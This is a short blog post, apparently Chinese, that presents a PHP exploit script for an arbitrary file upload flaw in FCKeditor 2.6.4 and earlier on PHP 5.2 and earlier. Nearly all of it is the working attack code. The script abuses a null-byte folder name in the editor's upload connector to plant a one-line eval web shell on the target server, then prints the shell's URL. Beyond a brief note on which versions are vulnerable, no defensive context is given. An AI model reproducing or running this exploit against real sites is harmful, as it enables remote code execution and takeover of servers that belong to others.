---
title: "Fckeditor PHP Exp"
date: 2018-01-06T00:00:00+08:00
draft: false
tags: ['cms']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

Fckeditor <= 2.6.4 PHP <= 5.2 通杀 Exp

<!--more-->

PHP 高版本不支持截断

```
<?php

error_reporting(0);

set_time_limit(0);

ini_set("default_socket_timeout", 5);

define(STDIN, fopen("php://stdin", "r"));

$match = array();

function http_send($host, $packet)

{

$sock = fsockopen($host, 80);

while (!$sock)

{

print "\n[-] No response from {$host}:80 Trying again...";

$sock = fsockopen($host, 80);

}

fputs($sock, $packet);

while (!feof($sock)) $resp .= fread($sock, 1024);

fclose($sock);

print $resp;

return $resp;

}

function connector_response($html)

{

global $match;

return (preg_match("/OnUploadCompleted\((\d),\"(.*)\"\)/", $html, $match) && in_array($match[1], array(0, 201)));

}

print "\n+------------------------------------------------------------------+";

print "\n| FCKEditor Servelet Arbitrary File Upload Exploit |";

print "\n+------------------------------------------------------------------+\n";

if ($argc < 3)

{

print "\nUsage......: php $argv[0] host path\n";

print "\nExample....: php $argv[0] localhost /\n";

print "\nExample....: php $argv[0] localhost /FCKEditor/\n";

die();

}

$host = $argv[1];

$path = ereg_replace("(/){2,}", "/", $argv[2]);

$filename = "ice.gif";

$foldername = "ice.php%00.gif";

$connector = "editor/filemanager/connectors/php/connector.php";

$payload = "-----------------------------265001916915724\r\n";

$payload .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"{$filename}\"\r\n";

$payload .= "Content-Type: image/jpeg\r\n\r\n";

$payload .= 'GIF89a'."\r\n".'<?php eval($_POST[ice]) ?>'."\n";

$payload .= "-----------------------------265001916915724--\r\n";

$packet = "POST {$path}{$connector}?Command=FileUpload&Type=Image&CurrentFolder=".$foldername." HTTP/1.0\r\n";//print $packet;

$packet .= "Host: {$host}\r\n";

$packet .= "Content-Type: multipart/form-data; boundary=---------------------------265001916915724\r\n";

$packet .= "Content-Length: ".strlen($payload)."\r\n";

$packet .= "Connection: close\r\n\r\n";

$packet .= $payload;

print $packet;

if (!connector_response(http_send($host, $packet))) die("\n[-] Upload failed!\n");

else print "\n[-] Job done! try http://${host}/$match[2] \n";

?>
```